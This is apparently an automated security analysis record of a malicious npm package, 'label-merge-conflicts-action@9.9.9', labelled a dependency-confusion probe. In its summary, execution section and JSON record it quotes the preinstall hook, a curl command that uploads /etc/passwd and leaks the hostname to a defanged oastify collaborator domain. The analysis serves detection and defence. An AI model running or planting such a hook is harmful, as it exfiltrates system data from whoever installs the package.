# npm label-merge-conflicts-action@9.9.9

**Source:** datadog · **Source label:** malicious · **Released:** 2024-12-16 (registry) · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-5-5)

## Summary

The package has a single `preinstall` hook in `package.json` that runs on every registry install. It calls `/usr/bin/curl --data '@/etc/passwd'` against a subdomain of oastify[.]com (Burp Collaborator) prefixed with `$(hostname)`, so the hostname leaks through DNS and `/etc/passwd` through an HTTP POST. There are no gates: the command runs unconditionally and only needs a POSIX shell, curl, `/etc/passwd` and outbound network access.

## Execution

- **preinstall** `/usr/bin/curl --data '@/etc/passwd' $(hostname)d2g2….oastify[.]com`: no package files; inline_shell.

## Gates

None.

## Requirements

- installed_tool: curl, hostname (hook calls /usr/bin/curl by absolute path and $(hostname) to build the subdomain)
- file_present: /etc/passwd (curl --data @/etc/passwd uploads the file)
- os: linux, darwin (POSIX shell substitution, /usr/bin/curl and /etc/passwd paths)
- network: *.oastify[.]com:80 (curl with no scheme defaults to http; the DNS lookup of the hostname-prefixed subdomain also leaks the hostname)

## Behaviour

- Ungated: recon, exfil
- Gated: none

## Notes

- No other code files ship; `main` points to a missing `index.js`.
- The tool's `download_then_exec` launch style was changed to `inline_shell`; nothing fetched is run.
- The Collaborator id is redacted to `d2g2…`.
- Version 9.9.9 on an empty package named like a GitHub Action points to a dependency-confusion probe. The code doesn't show whether a researcher or an attacker published it.

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "npm",
    "name": "label-merge-conflicts-action",
    "version": "9.9.9",
    "archive_sha256": "7f4b139141a5b20c01315236512d91d0815185daa1ef10c24c4290d71d3e62a7",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2024-12-16",
    "released_at_source": "registry",
    "sample_path": "datadog/npm/malicious_intent/2024-12-16-label-merge-conflicts-action-v9.9.9.zip",
    "package_root": "layer0/tmp/tmpu9mtoohn/label-merge-conflicts-action/package",
    "cluster_key": "4813650b0959ccd8c4b08d8acb50fceb944d00fc4abf2d0bdea7e1c4ca4c5f47",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "preinstall",
        "command": "/usr/bin/curl --data '@/etc/passwd' $(hostname)d2g2….oastify[.]com",
        "runs_on": "always",
        "file_chain": [],
        "interpreter": "sh",
        "launch_style": [
          "inline_shell"
        ],
        "silent_failure": false
      }
    ],
    "delays": [],
    "notes": [
      "package.json: the only package file (besides registry metadata), read in full. The main index.js is absent, so nothing runs at load time either.",
      "preinstall runs curl with no condition: POSTs /etc/passwd to an oastify (Burp Collaborator) subdomain prefixed with the machine hostname, leaking the hostname through DNS and the file over HTTP.",
      "The tool prefilled launch_style download_then_exec; corrected to inline_shell because the curl response is never run. Collaborator id redacted to its first 4 characters."
    ]
  },
  "requirements": [
    {
      "axis": "installed_tool",
      "value": [
        "curl",
        "hostname"
      ],
      "reason": "hook calls /usr/bin/curl by absolute path and $(hostname) to build the subdomain"
    },
    {
      "axis": "file_present",
      "value": "/etc/passwd",
      "reason": "curl --data @/etc/passwd uploads the file"
    },
    {
      "axis": "os",
      "value": [
        "linux",
        "darwin"
      ],
      "reason": "POSIX shell substitution, /usr/bin/curl and /etc/passwd paths"
    },
    {
      "axis": "network",
      "value": "*.oastify[.]com:80",
      "reason": "curl with no scheme defaults to http; the DNS lookup of the hostname-prefixed subdomain also leaks the hostname"
    }
  ],
  "conditions": [],
  "gates": [],
  "behaviours": {
    "ungated": [
      "recon",
      "exfil"
    ],
    "gated": []
  },
  "obfuscation": {
    "level": "none",
    "techniques": [],
    "decoded": null,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "<hostname>d2g2….oastify[.]com",
        "role": "exfil_sink"
      }
    ]
  },
  "attack_type": "dependency_confusion",
  "family_hint": "oastify collaborator /etc/passwd probe",
  "claude_assessment": "malicious",
  "assessment_reason": "The preinstall hook unconditionally uploads /etc/passwd and leaks the hostname to an out-of-band interaction service (oastify[.]com). Version 9.9.9 on an otherwise empty package fits a dependency-confusion probe.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [],
    "candidate_set": {
      "generator": "gate_extract@44d785b257",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 0,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
